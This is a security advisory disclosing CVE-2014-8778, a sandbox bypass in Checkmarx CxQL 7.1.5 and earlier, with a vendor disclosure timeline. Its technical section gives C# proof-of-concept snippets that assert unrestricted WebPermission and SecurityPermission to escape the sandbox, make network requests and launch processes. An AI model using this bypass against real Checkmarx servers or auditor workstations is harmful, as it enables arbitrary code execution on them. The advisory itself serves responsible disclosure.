@@ -1,0 +1,81 @@
+id: 24196
+date: 09/05/2015
+title: Checkmarx CxQL 7.1.5 Sandbox Bypass Vulnerability
+author: Huy-Ngoc DAU
+cves: CVE-2014-8778
+
+Checkmarx CxQL Sandbox bypass (CVE-2014-8778)
+
+Vendor: Checkmarx - www.checkmarx.com
+Product: CxSuite
+Version affected: 7.1.5 and prior
+
+Credit: Huy-Ngoc DAU (@ngocdh) of Deloitte Conseil, France
+
+================================
+Introduction
+================================
+Checkmarx is a static source code analysis suite (https://www.checkmarx.com).
+
+CxQL (Checkmarx Query Language) is a CSharp-based language defined by Checkmarx to query source code. CSharp critical classes/functions calls are however not allowed due to security reasons.
+
+CxQL can be executed on two locations:
+- Remotely on Checkmarx server if the analyzed source code is uploaded via the web interface,
+- Or locally in CxAudit (a thick client connected to the enterprise Checkmarx server), installed on an auditor's code review workstation.
+
+We identified a possibility of bypass that would allow execution of arbitrary and unauthorized CSharp code in those contexts, and thus compromise the security of the machine on which the code is executed, either a Checkmarx server or an auditor's workstation.
+
+The following scenarios describe attacks where this bypass is possible:
+- An auditor (a specific user allowed to execute his own CxQL queries) having only access to the Citrix interface of CxAudit can take control of the workstation,
+- A Checkmarx administrator having only access to Checkmarx web interface can take control of the Checkmarx enterprise server, and CxAudit workstations by injecting malicious code into default queries.
+
+================================
+Technical details
+================================
+
+1. Etablishing network connection
+The following code attempts to make a network connection and return the content in the debug panel:
+try
+{
+System.Net.WebRequest request = System.Net.WebRequest.Create("http://deloitte.fr");
+System.Net.WebResponse response = request.GetResponse();
+CxDebug((new System.IO.StreamReader(response.GetResponseStream())).ReadToEnd());
+}
+catch (Exception e)
+{
+CxDebug(e.Message);
+}
+
+However, the following error message is returned:
+Request for the permission of type 'System.Net.WebPermission, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=xxx' failed.
+
+We found that this permission issue could be bypassed by adding the following line before the code:
+(new System.Net.WebPermission(System.Security.Permissions.PermissionState.Unr
+estricted)).Assert();
+
+2. Executing system commands:
+The following code attempts to open calc:
+try
+{
+System.Diagnostics.Process.Start("calc");
+}
+catch (Exception e)
+{
+CxDebug(e.Message);
+}
+Checkmarx Auditor would crash despite try/catch instruction.
+
+By adding the following line, the code would be executed successfully:
+(new System.Security.Permissions.SecurityPermission(System.Security.Permissio
+ns.SecurityPermissionFlag.AllFlags)).Assert();
+
+================================
+Timeline
+================================
+25/10/2014 - bypass discovery
+04/11/2014 - vendor notification
+29/12/2014 - vendor asked to delay advisory publication
+21/07/2015 - patch confirmation from vendor in version 7.1.8
+03/09/2015 - advisory publication
+
+#  0day.today [2023-03-27]  #
